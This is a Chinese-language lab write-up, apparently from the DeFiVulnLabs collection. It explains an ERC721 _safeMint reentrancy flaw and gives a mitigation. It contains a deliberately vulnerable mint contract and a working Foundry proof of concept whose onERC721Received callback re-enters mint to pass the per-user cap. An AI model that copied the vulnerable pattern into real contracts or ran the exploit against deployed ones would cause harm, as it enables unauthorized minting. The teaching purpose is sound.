# 不受保护的回调——ERC721 SafeMint 重入

[Unprotected-callback.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Unprotected-callback.sol)  

**名称：** 不受保护的回调 —— ERC721 SafeMint可重入漏洞  

**描述：**  
合约ContractTest正在利用回调功能绕过由MaxMint721合约设置的最大铸造限制。这是通过触发onERC721Received函数来实现的，该函数在内部再次调用mint函数。  
因此，尽管MaxMint721试图将用户可以铸造的代币数量限制为MAX_PER_USER，但ContractTest合约成功铸造了超过这个限制的代币。  


**场景：**  
本练习涉及通过回调函数来铸造更多的非同质化代币(NFT)。


**缓解措施：**  
遵循“检查-效果-交互”原则，并使用OpenZeppelin重入防护机制。  

**参考：**  
https://blocksecteam.medium.com/when-safemint-becomes-unsafe-lessons-from-the-hypebears-security-incident-2965209bda2a  
https://www.paradigm.xyz/2021/08/the-dangers-of-surprising-code  


**MaxMint721合约：**  
```solidity
contract MaxMint721 is ERC721Enumerable {
    uint256 public MAX_PER_USER = 10;

    constructor() ERC721("ERC721", "ERC721") {}

    function mint(uint256 amount) external {
        require(
            balanceOf(msg.sender) + amount <= MAX_PER_USER,
            "exceed max per user"
        );
        for (uint256 i = 0; i < amount; i++) {
            uint256 mintIndex = totalSupply();
            _safeMint(msg.sender, mintIndex);
        }
    }
}
```
**如何测试：**  
`forge test --contracts src/test/Unprotected-callback.sol -vvvv`

```solidity
// 测试铸造新代币的公共函数
function testSafeMint() public {
    // 创建MaxMint721合约的新实例。
    MaxMint721Contract = new MaxMint721();
        
    // 尝试铸造最大数量的新代币。 
    // 根据正常实现，这应该铸造maxMints数量的新代币。
    MaxMint721Contract.mint(maxMints);
        
    // 控制台日志表明发生了一个漏洞，允许铸造19个NFT。
    console.log("Bypassed maxMints, we got 19 NFTs");
        
    // 该代码判断确实已经铸造了19个NFT。
    assertEq(MaxMint721Contract.balanceOf(address(this)), 19);
        
    // 输出由该合约铸造的NFT数量
    console.log("NFT minted:", MaxMint721Contract.balanceOf(address(this)));
}

// 此函数是一个标准的ERC721Receiver接口的实现，允许该合约从其他合约接收ERC721代币。
// 在此案例中，它用于执行铸造漏洞。
function onERC721Received(
    address,
    address,
    uint256,
    bytes memory
) public returns (bytes4) {
        
    // 检查这是否是第一次调用函数
    if (!complete) {
        // 将函数标记为调用
        complete = true;
            
        // 新代币数量为(maxMints - 1)  
        MaxMint721Contract.mint(maxMints - 1);
            
        // 记录请求铸造的代币数量
        console.log("Called with :", maxMints - 1);
    }
        
    // 这是成功接收ERC721代币的标准返回值
    return this.onERC721Received.selector;
}
```
**红框：**成功绕过maxMint限制   
![image](https://web3sec.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F86e9ee9c-86cb-4ef2-9c5a-cf8774cacda8%2FUntitled.png?table=block&id=a2eb9107-aa44-4bc6-a6b6-0c1a0f284393&spaceId=369b5001-5511-4fe6-a099-48af1d841f20&width=2000&userId=&cache=v2)
